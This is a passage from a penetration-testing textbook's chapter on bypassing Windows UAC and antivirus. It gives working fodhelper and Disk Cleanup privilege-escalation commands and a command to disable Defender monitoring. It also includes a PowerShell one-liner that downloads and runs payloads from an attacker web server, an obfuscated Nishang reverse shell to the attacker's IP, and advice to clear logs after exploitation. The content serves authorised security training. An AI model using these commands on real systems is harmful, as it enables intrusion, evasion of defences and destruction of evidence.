    <h2 id="_idParaDest-229" class="heading-2">User Account Control (UAC)</h2>
    <p class="normal">Recent developments show there are different ways to bypass Windows UAC, which can be found at <a href="https://github.com/hfiref0x/UACME"><span class="url">https://github.com/hfiref0x/UACME</span></a>. This project is primarily focused on reverse-engineering malware. All the source code is written in C# and C; this will require attackers <a id="_idIndexMarker1047"/>to compile the code and then perform the informed attacks.</p>
    <p class="normal">Microsoft <a id="_idIndexMarker1048"/>introduced security controls to restrict processes from running at three different integrity levels: high, medium, and low. A high integrity process has administrator rights, a medium-level process runs with a standard user’s rights, and a low integrity process is restricted, ensuring programs do minimal damage if they are compromised.</p>
    <p class="normal">To perform <a id="_idIndexMarker1049"/>any privileged actions, a program must be run as an administrator and comply with the UAC settings. The four UAC settings are as follows:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">Always notify</strong>: This is the most stringent setting, and it will prompt the local user whenever any program wants to use higher-level privileges.</li>
      <li class="bulletList"><strong class="keyWord">Notify me only when programs try to make changes to my computer</strong>: This is the default UAC setting. It does not prompt the user when a native Windows program requests higher-level privileges. However, it will prompt if a third-party program wants elevated privileges.</li>
      <li class="bulletList"><strong class="keyWord">Notify me only when programs try to make changes to my computer (don’t dim my desktop)</strong>: This is the same as the default setting, but it does not dim the system’s monitor when prompting the user.</li>
      <li class="bulletList"><strong class="keyWord">Never notify</strong>: This option reverts the system to pre-Vista days. If the user is an administrator, all programs will run with high integrity.</li>
    </ul>
    <p class="normal">Therefore, immediately after exploitation, the tester (and attacker) wants to know the following two things:</p>
    <ul>
      <li class="bulletList">Who is the user that the system has identified?</li>
      <li class="bulletList">What rights do they have on the system?</li>
    </ul>
    <p class="normal">This can <a id="_idIndexMarker1050"/>be determined using the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">C:\&gt; whoami /groups
</code></pre>
    <p class="normal">Here, a compromised <a id="_idIndexMarker1051"/>system is operating in a high-integrity context, as shown by the <code class="inlineCode">Mandatory Label\High Mandatory Level</code> label in <em class="italic">Figure 9.23</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_23.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.23: Common Windows privileges of an individual account</p>
    <p class="normal">If <code class="inlineCode">Label</code> is <code class="inlineCode">Mandatory Label\Medium Mandatory Level</code>, the tester will need to elevate from standard user privileges to administrator rights in order for many of the post-exploit steps to be successful.</p>
    <p class="normal">Assuming the attacker has a limited shell from the Shellter or Veil exploit, the first option to elevate privileges is to run <code class="inlineCode">exploit/windows/local/ask</code> from Metasploit, which launches the <code class="inlineCode">RunAs</code> attack. This will create an executable that, when invoked, will run a program to request elevated rights. The executable should be created using the <code class="inlineCode">EXE::Custom</code> option or encrypted using the Veil framework to avoid detection by the local antivirus.</p>
    <p class="normal">The disadvantage of the <code class="inlineCode">RunAs</code> attack is that the user will be prompted that a program from <a id="_idIndexMarker1052"/>an unknown <a id="_idIndexMarker1053"/>publisher wants to make changes to the computer. This alert may cause the privilege escalation to be identified as an attack, as shown in <em class="italic">Figure 9.24</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_24.png" alt="Graphical user interface, text, application, chat or text message  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 9.24: A popup that the victim will receive when exploit/windows/local/ask is run</p>
    <p class="normal">If the system’s current user is in an administrator’s group, and if the UAC is set to the default <strong class="screenText">Notify me only when programs try to make changes to my computer</strong> (it will not work if set to <strong class="screenText">Always Notify</strong>), an attacker will be able to use the Metasploit <code class="inlineCode">exploit/windows/local/bypassuac</code> module to elevate their privileges.</p>
    <p class="normal">To ensure that you can control the remote machine completely, we must be able to obtain administrative-level access. Attackers typically utilize <code class="inlineCode">getsystem</code> to escalate their current capability to system privileges.</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_25.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.25: Limited shell in Metasploit</p>
    <p class="normal">The <code class="inlineCode">ask</code> module creates multiple artifacts on the target system and can be recognized by <a id="_idIndexMarker1054"/>most antivirus software. Note that this will only work when the user is a local administrator. Let’s now <a id="_idIndexMarker1055"/>use the Windows local exploit to bypass the UAC. Once <code class="inlineCode">SESSION</code> is set to an active session, attackers will now be able to bypass the UAC set by the Windows operating system and a successful bypass will provide attackers with another Meterpreter session with system-level privileges, as shown in <em class="italic">Figure 9.26</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_26.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 9.26: Escalating the privilege using exploit/windows/local/ask via Metasploit</p>
    <h3 id="_idParaDest-230" class="heading-3">Using fodhelper to bypass UAC in Windows 10</h3>
    <p class="normal"><code class="inlineCode">fodhelper.exe</code> is the executable used by Windows to manage features in Windows settings. If the attackers have limited shell or normal user access to the victim system, they <a id="_idIndexMarker1056"/>can make use of <code class="inlineCode">fodhelper.exe</code> to bypass the UAC.</p>
    <p class="normal">Testers <a id="_idIndexMarker1057"/>have to note whether Microsoft Defender real-time monitoring is disabled, as this path might be blocked by the <a id="_idIndexMarker1058"/>defender as a UAC bypass. It is recommended to disable Microsoft Defender by running <code class="inlineCode">PowerShell.exe Set-MpPreference –DisableRealtimeMonitoring $true</code> from the command line as an administrator.</p>
    <p class="normal">Bypassing the UAC can be achieved by running the following commands in Windows PowerShell that take advantage of a trusted binary in Windows operating systems, which allows elevation without requiring a UAC prompt with most UAC settings. The binary checks for a specific registry key and executes the instruction:</p>
    <pre class="programlisting con"><code class="hljs-con">WmiObject Win32_UserAccount -filter "LocalAccount=True"| Select-Object Name,Fullname,Disabled
New-Item -Path HKCU:\Software\classes\ms-settings\shell\open\command -value cmd.exe –Force
New-ItemProperty -Path HKCU:\Software\classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
fodhelper
</code></pre>
    <figure class="mediaobject"><code class="inlineCode"><img src="../Images/B17765_09_27.png" alt="Background pattern  Description automatically generated"/></code></figure>
    <p class="packt_figref">Figure 9.27: Manual fodhelper UAC bypass</p>
    <p class="normal">Or, this <a id="_idIndexMarker1059"/>can be <a id="_idIndexMarker1060"/>achieved by running a single-line <a id="_idIndexMarker1061"/>PowerShell script. While the HTTP web server is hosted by the attackers, this can be achieved with the following:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Download the bypass script (<a href="https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2009/FodHelperBypassUAC.ps1"><span class="url">https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2009/FodHelperBypassUAC.ps1</span></a>)</li>
      <li class="numberedList">Start the <code class="inlineCode">apache2</code> service in Kali Linux by running <code class="inlineCode">sudo service apache2 start</code></li>
      <li class="numberedList">Copy the exploit to the relevant HTML folder, <code class="inlineCode">cp FodhelperBypass.ps1 /var/www/html/anyfolder/</code>, and then use it using the following command:
        <pre class="programlisting con"><code class="hljs-con">Powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1') FodhelperBypass -program 'cmd.exe /c Powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/agent.ps1')"
</code></pre>
      </li>
    </ol>
    <p class="normal">The preceding script will open a new shell to Empire PowerShell with high privileges. We will explore using PowerShell Empire in detail in <em class="chapterRef">Chapter 10</em>, <em class="chapterRef">Exploitation</em>.</p>
    <h3 id="_idParaDest-231" class="heading-3">Using Disk Cleanup to bypass UAC in Windows 10</h3>
    <p class="normal">This attack method involves Disk Cleanup, the Windows utility designed to free up space on the <a id="_idIndexMarker1062"/>hard drive. Default scheduled tasks on Windows 10 revealed a task named SilentCleanup, which executes the <a id="_idIndexMarker1063"/>Disk Cleanup process, <code class="inlineCode">cleanmgr.exe</code>, with the highest privileges, even if executed by an unprivileged <a id="_idIndexMarker1064"/>user. The process creates a new folder named <code class="inlineCode">GUID</code> in the <code class="inlineCode">Temp</code> directory and copies an executable and various DLLs into it. </p>
    <p class="normal">The executable is then launched, and it starts loading the DLLs in a certain order, as shown in <em class="italic">Figure 9.28</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM"
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_09_28.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.28: Escalating privileges using the DiskCleanUP vulnerability</p>
    <p class="normal">Although Microsoft Defender offers real-time monitoring, this exploit might work while running multiple times on the device. </p>
    <h2 id="_idParaDest-232" class="heading-2">Obfuscating the PowerShell and using fileless techniques</h2>
    <p class="normal">Recent <a id="_idIndexMarker1065"/>improvements <a id="_idIndexMarker1066"/>in the <a id="_idIndexMarker1067"/>endpoint <a id="_idIndexMarker1068"/>security defense mechanisms and real-time monitoring using the EDR have placed lots of limitations on the existing attacking tools. However, there are always new ways to bypass them. In this section, we will explore how to obfuscate a known PowerShell payload and get a remote shell to the attacker. </p>
    <p class="normal">We will leverage the <code class="inlineCode">PyFuscation</code> tool. This is written in Python 3 and has the ability to replace all the function names, variables, and parameters of a given PowerShell script. This can be cloned directly from the Git repository by running the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo git clone https://github.com/CBHue/PyFuscation 
cd PyFuscation 
sudo python3 PyFuscation.py 
</code></pre>
    <p class="normal">This should have the obfuscator ready to use. Now we will utilize the Nishang PowerShell <a id="_idIndexMarker1069"/>script to obfuscate <a id="_idIndexMarker1070"/>the payload. These <a id="_idIndexMarker1071"/>scripts can be cloned from the Git repository <a id="_idIndexMarker1072"/>by running <code class="inlineCode">sudo git clone https://github.com/samratashok/nishang</code> and, from the same folder, <code class="inlineCode">cd nishang/Shells</code>, add <code class="inlineCode">Invoke-PowerShellTcp –Reverse –IPAddress &lt;yourKaliIP&gt; -Port 443</code> to the <code class="inlineCode">Invoke-PowerShellTcp.ps1</code> script contents and save the file (this file is located in the <code class="inlineCode">nishang/shells</code> folder). An edited snippet of the code is shown in <em class="italic">Figure 9.29</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_29.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.29: Editing the Invoke-PowerShellTcp.Ps1 contents</p>
    <p class="normal">Finally, we will obfuscate the PowerShell script that we just edited with PyFuscation by running <code class="inlineCode">sudo python3 PyFuscation.py –fvp –-ps nameofthescript.ps1</code>. You should be able to see that the PowerShell scripts, functions, variables, and parameters have now been replaced with a new folder and a new filename, as seen in <em class="italic">Figure 9.30</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_30.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.30: Running PyFuscation on Invoke-PowerShellTcp.ps1</p>
    <p class="normal">Once <a id="_idIndexMarker1073"/>the file <a id="_idIndexMarker1074"/>is successfully <a id="_idIndexMarker1075"/>obfuscated, we <a id="_idIndexMarker1076"/>can change our directory to the output folder and then rename the file to something simpler to call from the target system, and we will host our web server using the Python module by simply running <code class="inlineCode">python3 –m http.server</code>, as shown in <em class="italic">Figure 9.31</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_31.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.31: Moving the file and hosting the Python web server</p>
    <p class="normal">On the <a id="_idIndexMarker1077"/>target <a id="_idIndexMarker1078"/>Windows machine, we can simply run <code class="inlineCode">wget http://&lt;yourkaliIP&gt;/filename.ps1 -Outfile anyfolder</code> from PowerShell.</p>
    <p class="normal">Now, the <a id="_idIndexMarker1079"/>final script is ready <a id="_idIndexMarker1080"/>to be scanned by the antivirus software. In this example, we will use Microsoft Defender to scan the script, as shown in <em class="italic">Figure 9.32</em>. It should never find anything malicious in the script. To see the difference, you can first try with the original script without the obfuscation, where you will see an alert from Microsoft Defender, marking it as malicious and quarantining it.</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_32.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.32: Microsoft Windows Defender confirmation that no new threats were found</p>
    <p class="normal">As <a id="_idIndexMarker1081"/>the last <a id="_idIndexMarker1082"/>step, once the script <a id="_idIndexMarker1083"/>is delivered <a id="_idIndexMarker1084"/>to the target, attackers can now open the port for the target to connect to. In this case, port <code class="inlineCode">443</code> was set in the initial payload. Once this PowerShell script is run, either by opening it in PowerShell or by running it, it should open up a direct reverse shell to the attackers without any antivirus/EDR blocking it, as shown in <em class="italic">Figure 9.33</em>:</p>
    <figure class="mediaobject"><img src="../Images/B18209_09_33.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.33: Remote shell on an attacker’s Kali Linux on port 443</p>
    <p class="normal">We will <a id="_idIndexMarker1085"/>explore <a id="_idIndexMarker1086"/>all the different <a id="_idIndexMarker1087"/>techniques <a id="_idIndexMarker1088"/>of how to maintain command and control in <em class="chapterRef">Chapter 13</em>, <em class="italic">Command and Control</em>.</p>
    <h2 id="_idParaDest-233" class="heading-2">Other Windows-specific operating system controls</h2>
    <p class="normal">Windows-specific <a id="_idIndexMarker1089"/>operating system controls can be further divided into the following five categories:</p>
    <ul>
      <li class="bulletList">Access and authorization</li>
      <li class="bulletList">Encryption</li>
      <li class="bulletList">System security</li>
      <li class="bulletList">Communications security</li>
      <li class="bulletList">Auditing and logging</li>
    </ul>
    <h3 id="_idParaDest-234" class="heading-3">Access and authorization</h3>
    <p class="normal">The majority of the exploitations are performed on the access and authorization section of the <a id="_idIndexMarker1090"/>security controls to gain access to the system and perform unauthorized activities. Some of the specific controls are as follows:</p>
    <ul>
      <li class="bulletList">Adding users to access Credential Manager, which will allow users to create applications as trusted callers. In return, this account can fetch the credentials of another user on the same system. An example would be where a user of the system adds their personal information to the <strong class="screenText">Generic Credentials </strong>sections, as shown in <em class="italic">Figure 9.34</em>:<figure class="mediaobject"><img src="../Images/B17765_09_34.png" alt=""/></figure>
        <p class="packt_figref">Figure 9.34: Microsoft Windows 10 Credential Manager</p>
      </li>
      <li class="bulletList">Logging <a id="_idIndexMarker1091"/>in through cloud-based accounts; by default, some Windows operating systems allow Microsoft accounts.</li>
      <li class="bulletList">Don’t forget that guest accounts in legacy systems and locked accounts are used as service accounts to run scheduled jobs and other services.</li>
      <li class="bulletList">Print driver installation can help to bypass the security controls set on the machine. Attackers can potentially replace the driver installation with a malicious <a id="_idIndexMarker1092"/>executable to provide a persistent backdoor to the system.</li>
      <li class="bulletList">Anonymous <strong class="keyWord">Security Identifier</strong> (<strong class="keyWord">SID</strong>), named pipe, and enumeration of the SAM accounts <a id="_idIndexMarker1093"/>are some of the controls that are applied to a system that is connected to the network either via domain or standalone security settings.</li>
      <li class="bulletList">Remotely accessing the registry paths and subpaths.</li>
    </ul>
    <h3 id="_idParaDest-235" class="heading-3">Encryption</h3>
    <p class="normal">Encryption <a id="_idIndexMarker1094"/>techniques engaged by Microsoft Windows typically relate to password storage, NTLM sessions, and secure channel data.</p>
    <p class="normal">Attackers are mostly successful in bypassing encryption, either by utilizing weaker cipher suites or disabling the feature itself.</p>
    <h3 id="_idParaDest-236" class="heading-3">System security</h3>
    <p class="normal">System-level <a id="_idIndexMarker1095"/>security revolves around the main local system-level exploitation and the controls that are in place to initiate a bypass:</p>
    <ul>
      <li class="bulletList">Time zone synchronization: In most organizations, all the endpoints will sync their time with the primary domain; this provides the opportunity for an attacker to nullify evidence or track an exploit.</li>
      <li class="bulletList">Page file creation, locking pages in the memory, and creating token objects –some of the token objects and page files run at a system level. One such classic attack is a hibernation file attack.</li>
      <li class="bulletList">One of the first things that penetration testers must consider when they gain access to a target system with local admin privileges is to authenticate themselves to the domain, escalate the privileges, and add a user to the domain who can create global objects and symbolic links, which will provide full access to the domain.</li>
      <li class="bulletList">Load and unload device drivers and set firmware environment values.</li>
      <li class="bulletList">Automatic administrative logon enabled for all system users.</li>
    </ul>
    <h3 id="_idParaDest-237" class="heading-3">Communications security</h3>
    <p class="normal">Typically, in communications security, the majority of the additional network devices are in place, but <a id="_idIndexMarker1096"/>with respect to <a id="_idIndexMarker1097"/>Windows digitally signed certificates and the <strong class="keyWord">Service Principal Name</strong> (<strong class="keyWord">SPN</strong>) server, target name validation is one of the notable things that penetration testers could utilize to develop a custom exploit. We will be exploring the exploitation of SPN in the next chapter.</p>
    <h3 id="_idParaDest-238" class="heading-3">Auditing and logging</h3>
    <p class="normal">Most of <a id="_idIndexMarker1098"/>the default configuration controls that Windows can potentially put in place involve enabling system logs. The following is the list of logs that can be enabled by any organization to utilize information during an incident/forensic analysis:</p>
    <ul>
      <li class="bulletList">Credential validation</li>
      <li class="bulletList">Computer account management</li>
      <li class="bulletList">Distribution group management</li>
      <li class="bulletList">Other account management level</li>
      <li class="bulletList">Security group management</li>
      <li class="bulletList">User account management</li>
      <li class="bulletList">Process creation</li>
      <li class="bulletList">Directive service access and changes</li>
      <li class="bulletList">Account lockout/logoff/logon/special logon</li>
      <li class="bulletList">Removable storage</li>
      <li class="bulletList">Policy changes</li>
      <li class="bulletList">Security state changes</li>
    </ul>
    <p class="normal">This provides a clear view of what types of logs the penetration testers must consider clearing after the exploit phase in our cyber kill chain methodology.</p>
    <h1 id="_idParaDest-239" class="heading-1">Summary</h1>
    <p class="normal">In this chapter, we took a deep dive into a systematic process for overcoming security controls set by organizations as part of their internal protection. We focused on different types of NAC bypass mechanisms, how to establish a connection to the external world using tunneling and bypassing the firewalls, and also learned about every level of network, application, and operating system controls to ensure that our exploits can successfully reach the target system. Additionally, we reviewed how to bypass antivirus detection through PowerShell obfuscation using PyFuscation and explored the Veil-Evasion and Shellter frameworks to make file-based exploits. We also saw how different Windows operating system security controls such as UAC, application whitelisting, and other Active Directory-specific controls put in place can be easily circumvented using the Metasploit framework.</p>
    <p class="normal">In the next chapter, we will examine various means of exploiting systems, including public exploits, exploit frameworks, such as the Metasploit framework, PowerShell Empire projects, and Windows-based exploits.</p>
  </div>
</body></html>